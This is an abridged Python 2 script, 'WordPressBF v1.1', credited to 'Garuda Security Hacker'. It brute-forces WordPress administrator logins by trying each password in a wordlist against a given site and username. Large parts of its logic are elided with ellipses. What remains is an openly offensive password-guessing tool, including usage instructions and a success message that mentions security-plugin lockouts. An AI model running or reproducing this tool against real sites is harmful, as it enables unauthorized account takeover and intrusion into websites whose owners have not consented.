...
#yukinoshita47[at]gmail.com

import urllib2, sys, re, urllib, httplib, socket

print "----------------------------------------------"
print "                WordPressBF v1.1"
print "              Garuda Security Hacker"
print "      Coded by  d3hydr8 And Yukinoshita 47 "
print "----------------------------------------------"
...
if len(sys.argv) not in [4,5,6,7]:
	...
	print "Example : ./wordpressbf.py http://site.com admin /root/darc0d3.lst -v  \n"
	sys.exit(1)
...
print "[+] BruteForcing Password:",host
print "[+] Username:",sys.argv[2]

try:
  	words = open(sys.argv[3], "r").readlines()
  	print "[+] Wordlist Loaded:",len(words),"\n"
except(IOError): 
...
for word in words:
	...
	if re.search("<strong>ERROR</strong>",site) and verbose == 1:
		...
		print "\n [!] Login Successfull \n if you cannot login you has been Lockdown by Wordpress Security Plugin \n username and password result :",sys.argv[2],word,"\n"
		sys.exit(1)
print "\n[-] Brute Complete\n"
